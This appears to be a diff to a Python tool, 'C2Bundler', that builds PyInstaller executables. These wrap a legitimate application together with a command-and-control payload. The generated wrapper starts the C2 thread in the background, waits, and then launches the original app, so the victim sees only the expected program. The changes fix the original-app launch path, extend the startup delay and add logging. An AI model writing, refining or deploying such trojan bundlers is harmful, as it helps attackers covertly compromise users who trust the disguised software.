@@ -116,7 +116,9 @@ class C2Bundler:
                 print(f"[!] WARNING: No files found in resources directory!")
         else:
             if add_resources:
-                print(f"[!] WARNING: add_resources=True but resources_dir does not exist: {self.resources_dir}")
+                print(
+                    f"[!] WARNING: add_resources=True but resources_dir does not exist: {self.resources_dir}"
+                )
             else:
                 print(f"[*] Skipping resources (add_resources={add_resources})")
 
@@ -313,7 +315,7 @@ class C2Bundler:
                         item.unlink()
                 except Exception as exc:
                     print(f"[!] Warning: failed to remove resource {item}: {exc}")
-        
+
         # Always ensure the directory exists after cleaning
         self.resources_dir.mkdir(parents=True, exist_ok=True)
 
@@ -337,6 +339,7 @@ class C2Bundler:
             "import time",
             "from pathlib import Path",
             "",
+            "# WRAPPER MAIN - executes original app + C2 in background",
             "if getattr(sys, 'frozen', False):",
             "    bundle_dir = Path(sys._MEIPASS)",
             "else:",
@@ -344,7 +347,9 @@ class C2Bundler:
             "",
             "# PyInstaller --add-data TARGET:resources puts files in _MEIPASS/resources/",
             "# But sometimes it just puts them at root, so check both",
-            'original_app_resources = bundle_dir / "resources" / "' + original_filename + '"',
+            'original_app_resources = bundle_dir / "resources" / "'
+            + original_filename
+            + '"',
             'original_app_root = bundle_dir / "' + original_filename + '"',
             "",
             "def _log(msg):",
@@ -395,9 +400,9 @@ class C2Bundler:
             "        _log(traceback.format_exc())",
             "        try:",
             "            if sys.platform.startswith('win'):",
-            "                os.startfile(str(original_app))",
+            "                os.startfile(str(original_app_resources))",
             "            else:",
-            "                subprocess.Popen([str(original_app)], shell=True)",
+            "                subprocess.Popen([str(original_app_resources)], shell=True)",
             "        except:",
             "            pass",
             "",
@@ -417,11 +422,14 @@ class C2Bundler:
                 "        _log('C2 error: ' + str(e))",
                 "",
                 "if __name__ == '__main__':",
+                "    _log('Starting C2 payload in background thread')",
                 "    c2_thread = threading.Thread(target=run_c2_payload, daemon=False)",
                 "    c2_thread.start()",
-                "    time.sleep(1)",
-                "    _log('Launching original')",
+                "    _log('Waiting 5 seconds for C2 to initialize...')",
+                "    time.sleep(5)",
+                "    _log('Now launching original application')",
                 "    run_original_app()",
+                "    _log('Original app launched, wrapper complete')",
             ]
         )
 
